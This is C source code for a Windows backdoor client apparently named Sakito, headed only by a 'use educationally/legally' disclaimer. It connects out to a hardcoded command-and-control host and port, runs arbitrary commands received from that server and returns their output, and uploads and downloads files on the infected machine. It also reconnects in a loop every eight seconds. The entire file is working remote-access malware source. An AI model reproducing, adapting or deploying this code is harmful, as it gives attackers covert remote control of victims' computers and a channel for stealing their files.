/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#include <ws2tcpip.h>
#include <stdint.h>
#include <direct.h>
#include <errno.h>
#include <stdio.h>

#include "headers/sakito_core.h"

#define HOST "127.0.0.1"
#define PORT 4443

#pragma comment(lib, "Ws2_32.lib")

// Function to create connect socket.
const SOCKET create_socket() {
	// Initialize winsock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	if (WSAStartup(ver, &wsData) != 0)
		return INVALID_SOCKET;

	// Create socket and hint structure
	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (connect_socket == INVALID_SOCKET)
		WSACleanup();

	return connect_socket;
}

// Function to connect the connect socket to c2 server.
int c2_connect(const SOCKET connect_socket) {
	// Create sokaddr_in structure.
	struct sockaddr_in s_in;
	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = inet_addr(HOST);
	s_in.sin_port = htons(PORT);

	// Connect to server hosting c2 service
	if (connect(connect_socket, (SOCKADDR*)&s_in, sizeof(s_in)) == SOCKET_ERROR) {
		closesocket(connect_socket);
		return SOCKET_ERROR;
	}

	return SUCCESS;
}

int send_pipe_output(HANDLE child_stdout_read, char* const buf, SOCKET connect_socket) {
	DWORD bytes_read; 
	while (1) {
		// Read stdout, stderr bytes from pipe.
		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);

		int32_t chunk_size = (int32_t)bytes_read;
		uint32_t chunk_size_nbytes = ntohl(chunk_size); // u_long == uint32_t
		
		// Send serialized file size int32 bytes to server.
		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint32_t), 0) < 1)
			return SOCKET_ERROR;

		// If we've reached the end of the child's stdout.
		if (bytes_read == 0)
			break;

		// Send output to server..
		if (send(connect_socket, buf, chunk_size, 0) < 1)
			return SOCKET_ERROR;
	}

	return SUCCESS;
}

// Function to execute command.
int exec_cmd(const SOCKET connect_socket, char* const buf) {
	HANDLE child_stdout_read;
	HANDLE child_stdout_write;

	SECURITY_ATTRIBUTES saAttr;  
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process's STDOUT.
	if (!CreatePipe(&child_stdout_read, &child_stdout_write, &saAttr, 0)) 
		return FAILURE;

	// Ensure the read handle is not inherited.
	if (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))
		return FAILURE;

	// Execute command via CreateProcess.
	if (!sakito_win_cp(child_stdout_write, buf))
		return FAILURE;

	return send_pipe_output(child_stdout_read, buf, connect_socket);
}

int ch_dir(char* const dir, SOCKET connect_socket) {
	char chdir_result[] = "1";
	_chdir(dir);

	if (errno == ENOENT) {
		chdir_result[0] = '0';
		errno = 0;
	}

	// Send change directory result to server.
	if (send(connect_socket, chdir_result, 1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Function to receive file from client (TCP file transfer).
int send_file(const SOCKET connect_socket, char* const buf) {
	// Default f_size value = -1
	int32_t f_size = FAILURE;

	// Open file with read permissions.
	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);

	// If File Exists.
	if (h_file != INVALID_HANDLE_VALUE) {
	   	// Get file size and serialize file size bytes.
		LARGE_INTEGER largeint_struct;
		GetFileSizeEx(h_file, &largeint_struct);
		f_size = (int32_t)largeint_struct.QuadPart;
	}

	// Send read file bytes to server.
	if (sakito_win_sendf(h_file, connect_socket, buf, f_size) < 1)
		return SOCKET_ERROR;

	// Receive file transfer finished byte.
	if (recv(connect_socket, buf, 1, 0) < 1)
		return SOCKET_ERROR;

	CloseHandle(h_file);

	return SUCCESS;
}

// Function to receive file from client (TCP file transfer).
int recv_file(const SOCKET connect_socket, char* const buf) {
	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);

	// Send file transfer start byte.
	if (send(connect_socket, FTRANSFER_START, 1, 0) < 1)
		return SOCKET_ERROR;

	// Receive file size.
	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize f_size.
	int32_t f_size = ntohl_conv(buf);

	// Initialize i_result to true/1.
	int i_result = SUCCESS;

	// If file exists.
	if (f_size > 0)
		// Windows TCP file transfer (recv) function located in sakito_tools.h.
		i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);

	// Close the file.
	CloseHandle(h_file);

	return i_result;
}

int send_cwd(char* const buf, SOCKET connect_socket) {
	// Store working directory in buf.
	GetCurrentDirectory(BUFLEN, buf);

	// Send buf bytes containing current working directory to server.
	if (send(connect_socket, buf, strlen(buf)+1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Main function for connecting to c2 server & parsing c2 commands.
int main(void) {
	while (1) {
		// Create the connect socket.
		const SOCKET connect_socket = create_socket();

		/* 
		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
		occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
		statement will parse & execute functions based on the order of probability.
		*/
		if (connect_socket != INVALID_SOCKET) {
			int i_result = c2_connect(connect_socket);

			if (i_result) {
				// 8192 == Max command line command length in windows + 1 for null termination.
				char buf[BUFLEN+1] = { 0 };

				init: // Receive initialization byte.
				i_result = recv(connect_socket, buf, 1, 0);
				
				while (i_result > 0) {
					// Send current working directory to server.
					if (send_cwd(buf, connect_socket) < 1)
						break;

					// Set all bytes in buffer to zero.
					memset(buf, '\0', BUFLEN);

					// Receive command + parsed data.
					if (recv(connect_socket, buf, BUFLEN, 0) < 1)
						break;

					// buf[0] is the command code and buf+1 is pointing to the parsed data.
					switch (buf[0]) {
						case '0':
							i_result = exec_cmd(connect_socket, buf+1);
							break;
						case '1':
							// Change directory.
							i_result = ch_dir(buf+1, connect_socket);
							break;
						case '2':
							// Exit.
							return EXIT_SUCCESS;
						case '3':
							// Upload file to client system.
							i_result = recv_file(connect_socket, buf);
							break;
						case '4':
							// Download file from client system.
							i_result = send_file(connect_socket, buf);
							break;
						case '5':
							// Reinitiate connection (backgrounded).
							goto init;
						case '6':
							// Server-side error occurred re-receive command.
							break;
					}
				}
			}
		}

		// If unable to connect or an error occurs sleep 8 seconds.
		Sleep(8000);
	}

	return FAILURE;
}

